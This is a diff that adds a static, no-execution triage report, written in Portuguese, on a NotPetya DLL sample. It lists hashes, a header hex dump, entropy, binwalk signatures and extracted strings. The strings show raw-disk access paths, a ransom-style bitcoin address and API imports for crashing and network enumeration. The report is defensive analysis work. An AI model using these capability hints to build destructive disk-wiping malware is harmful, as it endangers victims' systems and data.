@@ -1,0 +1,4586 @@
+
+
+================================================================================
+TRIAGEM DE RE — SEM DISASSEMBLY
+================================================================================
+Script:     dump 2.0
+Arquivo:    /home/victor/NotPetya/NotPetya.dll
+Tipo:       PE32 executable for MS Windows 5.01 (DLL), Intel i386, 5 sections
+Gerado em:  2026-11-06T19:21:08-03:00
+Estático:   sim
+Disassembly: desativado por projeto
+Execução:   o alvo não será executado
+
+
+================================================================================
+FERRAMENTAS DISPONÍVEIS
+================================================================================
+[OK]      file -> /usr/bin/file
+[OK]      stat -> /usr/bin/stat
+[OK]      md5sum -> /usr/bin/md5sum
+[OK]      sha1sum -> /usr/bin/sha1sum
+[OK]      sha256sum -> /usr/bin/sha256sum
+[OK]      sha512sum -> /usr/bin/sha512sum
+[OK]      b2sum -> /usr/bin/b2sum
+[ausente] ssdeep
+[OK]      strings -> /usr/bin/strings
+[OK]      readelf -> /usr/bin/readelf
+[OK]      nm -> /usr/bin/nm
+[OK]      size -> /usr/bin/size
+[OK]      checksec -> /usr/bin/checksec
+[OK]      scanelf -> /usr/bin/scanelf
+[OK]      lddtree -> /usr/bin/lddtree
+[OK]      dumpelf -> /usr/bin/dumpelf
+[OK]      eu-readelf -> /usr/bin/eu-readelf
+[OK]      eu-nm -> /usr/bin/eu-nm
+[OK]      eu-size -> /usr/bin/eu-size
+[OK]      eu-elflint -> /usr/bin/eu-elflint
+[OK]      patchelf -> /usr/bin/patchelf
+[OK]      binwalk -> /usr/bin/binwalk
+[ausente] yara
+[ausente] readpe
+[ausente] pescan
+[ausente] pehash
+[OK]      ltrace -> /usr/bin/ltrace
+[OK]      strace -> /usr/bin/strace
+[OK]      python3 -> /usr/bin/python3
+[OK]      timeout -> /usr/bin/timeout
+
+
+================================================================================
+IDENTIFICAÇÃO, PERMISSÕES E HASHES
+================================================================================
+
+$ file -- NotPetya.dll
+
+NotPetya.dll: PE32 executable for MS Windows 5.01 (DLL), Intel i386, 5 sections
+
+$ stat -- NotPetya.dll
+
+  File: NotPetya.dll
+  Size: 362360    	Blocks: 712        IO Block: 4096   regular file
+Device: 252,1	Inode: 58886576    Links: 1
+Access: (0644/-rw-r--r--)  Uid: ( 1000/  victor)   Gid: ( 1000/  victor)
+Access: 2026-11-06 19:21:08.614530971 -0300
+Modify: 2026-11-06 22:19:26.000000000 -0300
+Change: 2026-11-06 19:19:58.484100236 -0300
+ Birth: 2026-11-06 19:19:47.284191148 -0300
+
+$ md5sum -- NotPetya.dll
+
+71b6a493388e7d0b40c83ce903bc6b04  NotPetya.dll
+
+$ sha1sum -- NotPetya.dll
+
+34f917aaba5684fbe56d3c57d48ef2a1aa7cf06d  NotPetya.dll
+
+$ sha256sum -- NotPetya.dll
+
+027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745  NotPetya.dll
+
+$ sha512sum -- NotPetya.dll
+
+072205eca5099d9269f358fe534b370ff21a4f12d7938d6d2e2713f69310f0698e53b8aff062849f0b2a521f68bee097c1840993825d2a5a3aa8cf4145911c6f  NotPetya.dll
+
+$ b2sum -- NotPetya.dll
+
+4876001498002071b5cc81fac85a6b04aa004d7140a006cd9a9f53b8543036bd963bee822d738220a462226fdfe0cdda57ce12ae1611ebc81690c73b87b3cc3b  NotPetya.dll
+
+
+================================================================================
+PRIMEIROS 256 BYTES
+================================================================================
+
+$ od -Ax -tx1z -N 256 -- NotPetya.dll
+
+000000 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00  >MZ..............<
+000010 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  >........@.......<
+000020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >................<
+000030 00 00 00 00 00 00 00 00 00 00 00 00 f0 00 00 00  >................<
+000040 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68  >........!..L.!Th<
+000050 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f  >is program canno<
+000060 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20  >t be run in DOS <
+000070 6d 6f 64 65 2e 0d 0d 0a 24 00 00 00 00 00 00 00  >mode....$.......<
+000080 f1 0b 38 2f b5 6a 56 7c b5 6a 56 7c b5 6a 56 7c  >..8/.jV|.jV|.jV|<
+000090 26 24 ce 7c b4 6a 56 7c bc 12 c3 7c b7 6a 56 7c  >&$.|.jV|...|.jV|<
+0000a0 00 f4 b6 7c b3 6a 56 7c 00 f4 89 7c b4 6a 56 7c  >...|.jV|...|.jV|<
+0000b0 bc 12 c5 7c ae 6a 56 7c b5 6a 57 7c 10 6a 56 7c  >...|.jV|.jW|.jV|<
+0000c0 ae f7 f9 7c af 6a 56 7c ae f7 cd 7c b4 6a 56 7c  >...|.jV|...|.jV|<
+0000d0 ae f7 cb 7c b4 6a 56 7c 52 69 63 68 b5 6a 56 7c  >...|.jV|Rich.jV|<
+0000e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >................<
+0000f0 50 45 00 00 4c 01 05 00 5c 28 46 59 00 00 00 00  >PE..L...\(FY....<
+000100
+
+
+================================================================================
+ENTROPIA E DISTRIBUIÇÃO DE BYTES
+================================================================================
+Tamanho:          362360 bytes
+Entropia Shannon: 7.801934 bits/byte
+Bytes distintos:  256/256
+Bytes NUL:        20437 (5.64%)
+Mais frequentes:
+  0x00       20437    5.640%  .
+  0xff        5272    1.455%  .
+  0x8b        3351    0.925%  .
+  0x75        2851    0.787%  u
+  0x10        2806    0.774%  .
+  0x64        2671    0.737%  d
+  0x01        2567    0.708%  .
+  0x45        2359    0.651%  E
+  0x89        2347    0.648%  .
+  0x74        2342    0.646%  t
+  0xe8        2281    0.629%  .
+  0x0f        2217    0.612%  .
+  0x8d        2162    0.597%  .
+  0x50        2153    0.594%  P
+  0x08        2098    0.579%  .
+  0x83        2089    0.576%  .
+
+
+================================================================================
+ASSINATURAS E CONTEÚDO EMBUTIDO — BINWALK
+================================================================================
+
+$ binwalk NotPetya.dll
+
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Microsoft executable, portable (PE)
+53088         0xCF60          CRC32 polynomial table, little endian
+57184         0xDF60          CRC32 polynomial table, big endian
+61463         0xF017          Copyright string: "Copyright 1995-2013 Mark Adler "
+84000         0x14820         Microsoft executable, portable (PE)
+90208         0x16060         Microsoft executable, portable (PE)
+105196        0x19AEC         Zlib compressed data, best compression
+130156        0x1FC6C         Zlib compressed data, best compression
+157584        0x26790         Zlib compressed data, best compression
+349192        0x55408         Zlib compressed data, best compression
+356360        0x57008         Object signature in DER format (PKCS#7), header length: 4, sequence length: 5993
+356470        0x57076         DER SHA1 hash
+356509        0x5709D         Certificate in DER format (x509 v3), header length: 4, sequence length: 1120
+357633        0x57501         Certificate in DER format (x509 v3), header length: 4, sequence length: 1146
+358783        0x5797F         Certificate in DER format (x509 v3), header length: 4, sequence length: 1181
+359968        0x57E20         Certificate in DER format (x509 v3), header length: 4, sequence length: 1194
+
+
+
+================================================================================
+PE/COFF — METADADOS SEM DISASSEMBLY
+================================================================================
+readpe não instalado; mantendo a análise genérica.
+
+
+================================================================================
+STRINGS ASCII COM OFFSET
+================================================================================
+     4d !This program cannot be run in DOS mode.
+     8d jV|&$
+     d5 jV|Rich
+     f8 \(FY
+    1e8 .text
+    20f `.rdata
+    237 @.data
+    260 .rsrc
+    287 @.reloc
+    441 SVW3
+    496 \\.\f
+    537 QSSh
+    690 PVVhH
+    6d8 QQSV3
+    736 DVV3
+    787 QSVW3
+    7d1 IWW3
+    827 QSVWh
+    890 _^[t
+    8b2 SVWh
+    c49 Pj X
+    c68 Pj!X
+    c87 Pj"X
+    ca0 SVW3
+    ceb VSVj
+    df9 D$<f
+    e35 D$<f
+    e6c D$<P
+    ec3 D$<P
+    ee4 LL<;
+   1007 PVVV
+   1035 QPVV
+   1095 PSSj
+   10c1 QPSj
+   1195 SWWj
+   11d9 PjLh
+   11fa Pj8h
+   1209 PjHh
+   12f2 QQSVW
+   130d t]j:
+   131d j\Xf
+   1337 u3j j@
+   1345 t%VVP
+   13c1 SWPj
+   1461 _[^]
+   161a dddd
+   1798  5.1t]
+   17a2  5.2tY
+   17ac VisttU
+   17b6 ws 7tQ
+   17be 2008tOB
+   1821 8 R2t
+   190c F,Pf
+   1a23 QQSj
+   1a4c 0+@Iu
+   1b10 SWjb
+   1b3e 0r@Iu
+   1b57 jbXPf
+   1be8 j	Yje
+   1cf4 u+jK_W
+   1d04 trWhH
+   1d1b 0s@Iu
+   1dd4 SWj-
+   1e02 0u@Iu
+   1e1a 2jXXj
+   1e2b @j-f
+   1e55 t2j\X
+   1ec5 j	Yj8
+   1ee6 VWj#f
+   1ef6 j*Yf
+   1f65 u:jJZf
+   1fa5 uqjHZj
+   1fb6 Yj&f
+   1fbd YjYf
+   1ffd @TxW4
+   2012 @`Eg
+   2098 u$Wj	Y
+   20c6 E _[^
+   2102 txWj
+   210f jBYf
+   2185 QSVW3
+   21c9 t^jbYf
+   2282 u&j<Yj
+   22ac u$j@Xj
+   22bc j@Xf
+   231f "VWh
+   23bc "VWh
+   2446 M,VWPf
+   248b "VWh
+   2507 SVWj
+   251b oj'^
+   262d pj+^
+   2711 QSVW
+   271b u(!]
+   2857 U,VWPf
+   286c QQSVW3
+   287e 9}$u
+   28a6 j5Xf
+   2a34 "VWh
+   2acb "VWh
+   2b37 QSVW
+   2cef j	YP
+   2d89 QSVW3
+   2d99 9](u
+   2dcc jBXf
+   2f1d U4Vf
+   2f60 QQVh
+   2f7a }SWh
+   3190 @=w	
+   31ed ]$VW
+   324c 0@;E
+   3262 u$@SVh
+   32c0 H_^[
+   32da u PV
+   35c2 uv9C	
+   36e4 @SVWj
+   37af M Wj
+   38d0 f;K*u
+   38d8 P f;S.u
+   38e4 f;S,u
+   3ca1  SVW
+   3ef6 H_^[
+   3f0b }(95
+   3f3e E SV
+   3f7f u4Pj
+   3f9a _^[]
+   409a u(SVP
+   40c5 9E,t
+   411f u(SVQ
+   41be j#Yf
+   41d2 u(Sj
+   4230 u(Sj
+   42c2 u(Sj
+   43bc HpSW;HxuE
+   43c6 Ht;H|u=
+   442c SVWjL
+   4485 ;T7<u
+   44e8 E(SVWP
+   4510 E(!u
+   4529 f;E(
+   4533 f;](v
+   47ad j/Pj WS
+   48be PVWS
+   48fa j6Yf
+   4c8a E#8j
+   4e86 <SVW
+   4ee5 D$4P
+   4eea D$,PVVj
+   4ef7 D$,P
+   4eff t$Dh
+   4f15 D$(;
+   4f76 L$4Q
+   4f7e L$@Qj
+   4f88 D$0h
+   4f93 t$4W
+   4fcc Yf;H
+   4ff5 t$$W
+   4ffe t$@h
+   504d D$0P
+   50b9 t$,V
+   50f2 t$0W
+   50f7 t$(V
+   5114 |$8V
+   512c t$@W
+   5135 t$,V
+   51d1 \$8Sj
+   5217 t$4W
+   525e t$$WhS
+   5274 !D$<
+   5279 D$4P
+   527e D$,Ph
+   5290 D$TP
+   54f2 t$$WhS
+   5509 D$4P
+   550e D$,Ph
+   5520 D$TP
+   5529 F<Wh
+   5643 t$(W
+   5656 t$(W
+   5853 T$4R3
+   589f D$DP
+   58f4 t$<P
+   591b t$$P
+   595c D$8P
+   5969 t$8@
+   596e t$8h
+   5977 t$TP
+   597c t$0W
+   599c D$<9t$<r
+   59b9 D$8P
+   59c6 t$8@
+   59d3 t$TP
+   59d8 t$0W
+   5a4a t$(V
+   5a7c t$(W
+   5a8f TVWjT
+   5b42 Ph~f
+   5c9e tnWh
+   5da5 QQSW
+   5db7 f98t
+   5dc5 j Zf
+   5dcb f99u
+   5de2 t@9}
+   5e6b th9}
+   5e9d t&j:W
+   60e0 _^[]
+   6474 F$9E
+   6572 t^WV3
+   65e3 t`WV
+   6861 PVVVj
+   6893 PVVV
+   6acc PSSh
+   6aed t#h`
+   6b80 PSht@
+   6cd5 9;vh
+   6d7b PjeV
+   6dad t_S3
+   6eba 8\u<f
+   6fb1 u(9X0t)9X
+   7067 SSWh
+   70e4 Fh@A
+   7181 t^95
+   728f WWWh
+   7384 PhX}
+   73fc WWWh
+   744d WPht
+   7588 WWWhP
+   75c0 SVW3
+   75d3 Pj(3
+   75ff t0VVV
+   7685 QSVW
+   7718 8_^[
+   7731 PhdA
+   7853 PSSh
+   7903 Xj<Y
+   7b0f DK!.t
+   7b6a SVW3
+   7bb8 L$pQP
+   7bbe D$x,
+   7c06 D$,;
+   7c2d D$(Pj
+   7c34 D$(Pj
+   7c48 9t$4t
+   7c4e 9t$ 
+   7c78 D$<VP
+   7c86 D$(Pj8
+   7c8d D$@Pj
+   7c9e |$@3
+   7cb0 tE@;D$
+   7cbc D$$Pj
+   7d11 D$pP
+   7d55 VV@PVVh
+   7e15 PPj#P
+   7ef8 tpVWP
+   7f07 tWSVW
+   7f79 tDhH
+   7ff8 PVVj
+   80c4 $SVW3
+   80fb PVVh
+   811f PVVVVh 
+   8154 @_^[
+   8163 SVW3
+   8191 PVVh
+   81a5 D$$k
+   81b7 t&VV
+   81bc t$,W
+   81cd t$,SW
+   8207 QQSV
+   828f SVW3
+   829a D$(SP
+   842b SSVh
+   846e C;\$
+   8493 SVW3
+   860a tsSVW
+   8738 ~(SV
+   8760 ^[_]
+   88f0 tlVP
+   89b5 P<SV
+   8a7a _^[3
+   8c53 {h0D
+   8d48 j\Zf
+   8da5 \$$9]
+   8fac D$@SP
+   8fbf D$8D
+   8fc7 |$df
+   8fcc D$h9\$
+   8ff1 u39]
+   9043 D$(P
+   9048 D$<PSSh
+   9065 P9\$@t
+   9093 D$ P
+   90ab 9\$xt
+   90b7 9\$pt
+   90c3 9\$tt
+   90cf 9\$,t
+   90db 9\$(t
+   90ed 9\$ t$
+   90ff 59|$
+   9108 9\$ 
+   9393 ,SVW
+   940c t?WWW
+   94c0 PPPV
+   959f t#QQWhs
+   9638 t)j!j
+   9679  SVW
+   96f1 SVW3
+   972a SGWj
+   9762 Ph~f
+   995b uDVj
+   99fb u	9F
+   9b86 ;K$v
+   9e54 )C@3
+   9ead S@;Q s
+   9f53 S@;Q(s
+   a062 X_^[
+   a176 tBHt
+   a392 Ch;C\r
+   a3d3 PRQj
+   a3d9 CpPj
+   a4f3 Yf9M
+   a5ba ChIu
+   a632 CpPj
+   a665 C`RQ
+   a734 KLH#
+   aadb ;K,v
+   aaf6 C4;K0v
+   ac5d to9C
+   ad05 C89S(u
+   aeb2 81uq
+   aecc 9^ u
+   aed9 ^(9^$u
+   af29 X_^[]
+   af90 9s$t
+   afb7 X_^[]
+   aff9 tYV3
+   b06b G9^4u 
+   b091 9^(u
+   b0c8 N+~0;
+   b103 N(9N0u
+   b11c _^[]
+   b34a _^[]
+   b67d f9Tu
+   b6cb f9LU
+   b772 t5Ht
+   b9d0 Fast decoding Code from Chris Anderson
+   b9f8 invalid literal/length code
+   ba14 invalid distance code
+   ba2c invalid distance too far back
+   bad0 WVUS
+   bbb3 wkPSQR
+   bbd1 Genuu8
+   bbd9 ntelu0
+   bbe1 ineIu(
+   bc19 ZY[X
+   bd04 +D$(;
+   bd41 9|$(t
+   bdad t$8;
+   bde6 D$0;
+   be08 L$0;
+   bf2b +D$(;
+   bf6d 9|$(t
+   bfe9 t$8;
+   c01e D$0;
+   c03c L$0;
+   c15e []^_
+   c4c8 1.2.8
+   cd78 incorrect header check
+   cd90 unknown compression method
+   cdac invalid window size
+   cdc0 unknown header flags set
+   cddc header crc mismatch
+   cdf0 invalid block type
+   ce04 invalid stored block lengths
+   ce24 too many length or distance symbols
+   ce48 invalid code lengths set
+   ce64 invalid bit length repeat
+   ce80 invalid code -- missing end-of-block
+   cea8 invalid literal/lengths set
+   cec4 invalid distances set
+   cedc invalid literal/length code
+   cef8 invalid distance code
+   cf10 invalid distance too far back
+   cf30 incorrect data check
+   cf48 incorrect length check
+   cfe1  n;^
+   d0a1 Qkkbal
+   d1af i]Wb
+   d2ef 9a&g
+   d2f8 MGiI
+   d2fd wn>Jj
+   d33f #.zf
+   d34d +o*7
+   d415 Z* ,	
+   d525 H$6t
+   d647 52F*
+   d6f6 	#jT$
+   d802 ^6o}
+   d82d [-&LMb#{'
+   d873 w+OQvr
+   d8b9 R1h58
+   d8ea SKyu
+   d956 )\ZEo^m/
+   dbba ru&o
+   dbf0 i8P/
+   dc0c ?(3w
+   dc27 H*0"ZOW
+   dc9b {kHw
+   dcef )T`D
+   dd53 !AxU
+   dd70 l!;b	F
+   dd8c :1X:
+   ddd4 y9*O
+   dde2 kM`~
+   de05 Vc0a
+   de6f dQy/
+   ded3 lDa>
+   dede 7~8A
+   df43 C-Yn
+   dfed gqr<
+   e04f $/o|
+   e05d f-=v
+   e189 mj>zjZ
+   e1b9 l6qnk
+   e2f8 IiGM>nw
+   e366 1A26b
+   e40f i91k
+   e51d ewh/?y
+   e52e *5KS
+   e5b5 6~_'
+   e5fd F*.f
+   e64d 1wsHp
+   e7df M8MF
+   e7fe Pe6^
+   e830 #bML"
+   e84a `F(>
+   e874 vQO+t
+   e8b7 [h1R
+   e916 XsBI
+   e922 hPU3
+   e958 ^oEZ_
+   eb77 2%k_
+   eb9a w3Xc
+   ebf0 /P8i
+   ec0a OZw3(?
+   ec28 Z"0*
+   ecb9 fP~V
+   ed67 ^GP~
+   ed70 b;!l
+   ed8a V_:X1:
+   edae NJ2"v
+   edd4 O*9y]
+   ee42 fu`z
+   ee71 /yQA
+   eee6 &]|v
+   ef88 need dictionary
+   ef98 stream end
+   efa4 file error
+   efb0 stream error
+   efc0 data error
+   efcc insufficient memory
+   efe0 buffer error
+   eff0 incompatible version
+   f008  inflate 1.2.8 Copyright 1995-2013 Mark Adler 
+   f138 \\.\PhysicalDrive
+   f14c 123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz
+   f188 1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX
+   fdbf %3%2%1%075613244
+   fdd1 bdd,
+   fddb pZdddd
+   fde2 Badd,
+   fdeb 1gdd,
+   fdf3 cdd,
+   fdfc dddd
+   fe01 cadd,
+   fe0a Rgdd,
+   fe12 cdd,
+   fe21 `dd,
+   fe29 sgdd,
+   fe31 cdd,
+   fe39 qdddd
+   fe40 `dd,
+   fe49 fdd,
+   fe4e a3cdd,
+   fe59 dddd
+   fe5f `dd,
+   fe68 fdd,
+   fe6d a$cdd,
+   fe78 dddd
+   fe7e `dd,
+   fe87 fdd,
+   fe8c aMcdd,
+   fe9d `dd,
+   fea6 fdd,
+   feab avcdd,
+   febb )`dd,
+   fec5 fdd,
+   fecc bdd,
+   feda J`dd,
+   fee3 9fdd,
+   feeb bdd,
+   fef9 k`dd,
+   ff02 Zfdd,
+   ff0a bdd,
+   ff11 @udddd
+   ff19 gdd,
+   ff21 {fdd,
+   ff29 bdd,
+   ff31 +dddd
+   ff38 gdd,
+   ff40 dfdd,
+   ff48 bdd,
+   ff50 tdddd
+   ff57 gdd,
+   ff60 edd,
+   ff6b +gdd
+   ff7f edd,
+   ff88 edd(
+   ff8f bdd%
+   ff9a dtdd)U
+   ffa5 add,
+   ffb7 qbbdd,
+   ffc2 i;bdd,
+   ffcc Fedd,
+   ffd2 Q3bdd,
+   ffe1 YKbdde
+   ffeb fdd,
+   fff0 Q)add
+   fff6 ikbdd,e
+  10003 Abbdd,
+  10011 ddd,U
+  1001a add,M
+  1002c add,
+  10032 D>=,
+  10041 add.
+  10053 adde
+  10072 qoadd,
+  1007a ddddddd,U
+  10089 qXadd,
+  100ae `dd5(
+  100b6 ddd)U
+  100c0 `dd,
+  100cb qfadd,
+  100e1 `dd,
+  100eb `dd,
+  100f8 i)`dd
+  10100 `dd,
+  10105 i\`dd
+  1010d `dd,
+  10121 gdddddd
+  1012c YNddd,
+  10134 `dddddd,gi
+  10144 <<:;9>=?%8%9%:%;,
+  1015b 7256,
+  10161 lddddddd5,
+  1016e gdd,
+  10176 qs`dd,
+  10185 ddd,
+  1018c gdd,U
+  101a1 ddd,
+  101ae gdd,
+  101b6 3fdd
+  101bb i>`dd]
+  101c5 ddd,
+  101cc gdd,
+  101d9 gdd,
+  101e2 gdd,
+  101f2 yo`dd,
+  1020f  |l,
+  1021b yf`dd,M
+  10229 Ofdd
+  10230 gdd]
+  1023a aggdd,
+  10241 i`gdd,
+  1024d gdd,
+  1025c q=gdd,
+  10268 dded
+  1027f >=:?
+  1028e gdd,e
+  10298 a9gdd,M
+  102b8 aYgdd
+  102be 256,
+  102c6 q{gdd,
+  102cf aRgdd,e
+  102d8 qagdd,
+  102e8 dadd,]
+  102f5 Qdgdd
+  10307 D>=:
+  1030c 7651,
+  10316 dedd3,
+  1032a ddd,
+  10335 ,edd,
+  10350 edd,
+  1036a edd,
+  10384 edd,
+  103a7 kedd,
+  103c1 1edd
+  103d7 -edd;,
+  103df dedd9=>?
+  103e8 23,U
+  103fe ddd,U
+  10411 253,
+  10437 236,
+  10458 253,
+  10494 `A\ddd,
+  104af l,Idtdd
+  104ba 325,U
+  104f5 %x,e
+  10504 %D,e
+  10513 %@,e
+  10542 ddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddLgddDddd
+  10607 dddlgdd(ddd
+  10613 fddeddd
+  1061e dddddddd
+  10627 kjddddd7132%0%1%2%3,
+  1064a d`dd
+  1064f dddd9,
+  1065d d`dd,
+  10665 jdd-
+  1068d idd5k
+  106a0 idd,
+  106af e^#`
+  106bc AYidd,
+  106c3 IZidd,
+  106ca Q[idd
+  106d1 dddd=)U
+  106e3 iJidd,
+  106f5 $ddddddd-
+  106ff dTdddddd,U
+  1070c 9kdd,U
+  10724 hdd,
+  1072d 9kdd,
+  10735 jdd,
+  10740 :,,U
+  10747 9kdd,
+  1074d "4,U
+  10754 9kdd,
+  1075a Y=jddU
+  10776 mdd,
+  1077d fdd,
+  10784 mdd,
+  1078b fdd,
+  10792 mdd,
+  10799 fdd,
+  107a0 mdd,
+  107a7 fdd,
+  107ae ldd,
+  107b5 fdd1,
+  107bd edd,
+  107c6 fdd,
+  107ce wedd
+  107d3 ~gdd,
+  107dc aedd,
+  107f1 !D,M
+  107fc gdd,
+  1080a gdd,
+  10817 *add,
+  10825 3add,
+  10833 3bdd,
+  10842 bdd,
+  10850 cdd,
+  10859 ddd,
+  10876 ddd,
+  10886 ddd,
+  1089c dddO
+  108a8 /x,e
+  108c1 fddddddd
+  108d3 ddd1,
+  108df Lcdd
+  10903 ddd(
+  1090a ddd-
+  1090f $ddddddd,
+  10931 )4,U
+  1093c dddddd,
+  10944 dddddddd,
+  10971 dddddd,
+  10979 dddddddd,
+  10993 ndddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd,
+  10a3b ddddddddddddddddddddddddddddddddddddddddddddddddd367,
+  10aa2 4!dd
+  10adb ddd,
+  10ae0 1|,U
+  10af1 367,
+  10b12 $ddddddd-
+  10b1c dTdddddd,
+  10b3c $ddddddd-
+  10b46 dTdddddd,
+  10b5e D?>;
+  10b63 36752,
+  10b98 Lddddddd6,
+  10ba4 >,g!t2,
+  10bee =?>;
+  10bf3 3675,
+  10c05 4edd
+  10c0a {add,
+  10c13 &edd,
+  10c1d lddddddd,
+  10c27 eddddddd,
+  10c34 1|,e
+  10c47 9T,]
+  10c4e kedd-
+  10c65 ddd,
+  10c90 ddd,
+  10cd8 ddddddd
+  10d1b cbdd,
+  10d26 add,
+  10d30 `dd,
+  10d64 =?>;
+  10d80 3675,
+  10d8e ddd,
+  10d93 lddddddd,
+  10d9d addddddd,
+  10daa 1|,e
+  10dc2 ddd-
+  10dd8 ddd,
+  10ddd 1D,e
+  10df2 ddd,
+  10e16 !<dddd
+  10e45 !<,U
+  10e50 k,e!<,
+  10e57 !D,g!<,
+  10e5f 9L,e|,
+  10e89 =?>;
+  10e8e 3675,
+  10e94 lddddddd,
+  10e9e gddddddd,
+  10eab 1|,e
+  10ee4 hddd
+  10efa =?>;
+  10eff 3675,
+  10f1a ddd,
+  10f1f Lddddddd6,
+  10f2b >,g!t-
+  10f40 ddddddd,
+  10f4a dddfk
+  10f51 ddd,
+  10f57 ddd$
+  10f60 dddfddd-
+  10f6d dddd(
+  10f79 ddd`ddd,
+  10f83 dddD
+  10f8c dddf
+  10f95 dddDddd
+  10f9f ddd`
+  10fa8 ddd$ddd,
+  10fd2 ddd(
+  10fd9 ddd,
+  11006 =?>;
+  1100f dddddddd
+  11018 h63,
+  1101d eddddddd,
+  1103c dddddddd,
+  1105e ddd327,
+  11080 ddd467,
+  11088 kddddddd,
+  1109e dddddddd,
+  110ab lddddddd,
+  110c4 ?><,
+  110e4 dddd,
+  110ec dddd,
+  11104 ==99?:;
+  11110 ,O)l,
+  1111e h9?:;>,e
+  11129 dddd3675,
+  11133 lddddddd,
+  1113d hddddddd,
+  1114a 1|,e
+  1115e kddddddd,
+  1116f $ddddddd-
+  11179 dTdddddd,
+  111a3 ddd,
+  111b3 dddd
+  111bd ddd,
+  111c4 ddd,
+  111d2 ddd,M
+  111dc ddd,
+  111eb ddd,
+  111f2 ddd,
+  11201 eddd
+  1121e =?>;
+  11223 367524,
+  1123b ddd,
+  11240 kddddddd
+  1126a ddd,
+  112b9 <:=?>;
+  112c0 36752
+  112d1 h,g^,
+  112dc ddd,
+  112f9 ddd,
+  11316 eddddddd
+  1131f d:=?>;
+  11326 36752,
+  11341 ddd,
+  11362 4!dd
+  113cd dddD
+  113e6 eddddddd
+  113ef d:=?>;
+  113fe ddddddddddddddddddddddddzdddEidd*idddmddd:idddddddddd
+  11434 dddd<,
+  11458 uedd(
+  11460 medd0156723,U
+  11489 ddd,
+  11496 ddd,U
+  114ae ,_0@D
+  114c6 [4!dd
+  114df ddd,e
+  114e6 3x,e
+  114ec ;D,e
+  1150f ,_0@|
+  11532 ;:?>=98
+  11559 >q.df1
+  1156f B4,U
+  11576 iWddd,
+  1157d yHddd,M
+  1158c iiddd,
+  115a0 <%;%:%9%8:;9?
+  11676 33333E
+  116fd 33333
+  1176c E)O 
+  118e9 E)O 
+  11941 0E5G
+  11a09 <$O333
+  11a1a E4'4
+  11a42 M.33
+  11d2f O(<$O
+  11d71 O<$r
+  11e74 w22222222
+  11f4f 333$w
+  11f5b 333$
+  11f75 333$V
+  11f8f 333$C
+  11fa9 333$H
+  11fcd 333$
+  11fe7 333$
+  11ffd 333$
+  1210e E4';
+  12188 ,333
+  123bb E)O 
+  123fb O<$u
+  124dc $'wG
+  125c0 E)O 
+  12618 0E5G
+  126e5 <$O333
+  126f6 E4'4t3333'=O
+  12721 M.33
+  1273d 233G
+  12a59 O(<$Y
+  12b80 E4$<
+  12c27 w22222222
+  12cd4 333I
+  12d5f 333I
+  12d8b 333$w
+  12d97 333$
+  12db1 333$V
+  12dcb 333$C
+  12de5 333$H
+  12e09 333$
+  12e23 333$
+  12e39 333$
+  12f4a E4';
+  12fc4 ,333
+  13234 IsWow64Process
+  13290 GetExtendedTcpTable
+  135a4 ntdll.dll
+  135b0 NtRaiseHardError
+  135c4 \\.\C:
+  135cc \\.\PhysicalDrive0
+  135e0 255.255.255.255
+  135f0 %u.%u.%u.%u
+  13bd2 CreateFileA
+  13be0 HeapAlloc
+  13bec SetFilePointerEx
+  13c00 HeapFree
+  13c0c GetProcessHeap
+  13c1e WriteFile
+  13c2a ReadFile
+  13c36 GetSystemDirectoryA
+  13c4c GetLastError
+  13c5c DeviceIoControl
+  13c6e CloseHandle
+  13c7c FindFirstFileW
+  13c8e MapViewOfFile
+  13c9e UnmapViewOfFile
+  13cb0 GetDriveTypeW
+  13cc0 WaitForSingleObject
+  13cd6 GetLogicalDrives
+  13cea FlushViewOfFile
+  13cfc Sleep
+  13d04 CreateFileW
+  13d12 GetFileSizeEx
+  13d22 FindClose
+  13d2e LocalAlloc
+  13d3c CreateFileMappingW
+  13d52 FindNextFileW
+  13d62 LocalFree
+  13d6e CreateThread
+  13d7e GetTickCount
+  13d8e MultiByteToWideChar
+  13da4 LeaveCriticalSection
+  13dbc SetLastError
+  13dcc EnterCriticalSection
+  13de4 HeapReAlloc
+  13df2 InitializeCriticalSection
+  13e0e InterlockedExchange
+  13e24 GetTempFileNameW
+  13e38 PeekNamedPipe
+  13e48 CreateProcessW
+  13e5a GetCurrentProcess
+  13e6e ConnectNamedPipe
+  13e82 GetModuleHandleW
+  13e96 CreateNamedPipeW
+  13eaa TerminateThread
+  13ebc DisconnectNamedPipe
+  13ed2 FlushFileBuffers
+  13ee6 GetTempPathW
+  13ef6 GetProcAddress
+  13f08 DeleteFileW
+  13f16 FreeLibrary
+  13f24 GlobalAlloc
+  13f32 LoadLibraryW
+  13f42 GetComputerNameExW
+  13f58 GlobalFree
+  13f66 ExitProcess
+  13f74 GetVersionExW
+  13f84 GetModuleFileNameW
+  13f9a DisableThreadLibraryCalls
+  13fb6 ResumeThread
+  13fc6 GetEnvironmentVariableW
+  13fe0 GetFileSize
+  13fee SetFilePointer
+  14000 FindResourceW
+  14010 LoadResource
+  14020 GetCurrentThread
+  14034 OpenProcess
+  14042 GetSystemDirectoryW
+  14058 SizeofResource
+  1406a GetLocalTime
+  1407a Process32FirstW
+  1408c LockResource
+  1409c Process32NextW
+  140ae GetModuleHandleA
+  140c2 lstrcatW
+  140ce CreateToolhelp32Snapshot
+  140ea GetWindowsDirectoryW
+  14102 VirtualFree
+  14110 VirtualAlloc
+  14120 LoadLibraryA
+  14130 VirtualProtect
+  14142 WideCharToMultiByte
+  14158 GetExitCodeProcess
+  1416e WaitForMultipleObjects
+  14186 KERNEL32.dll
+  14196 wsprintfW
+  141a2 ExitWindowsEx
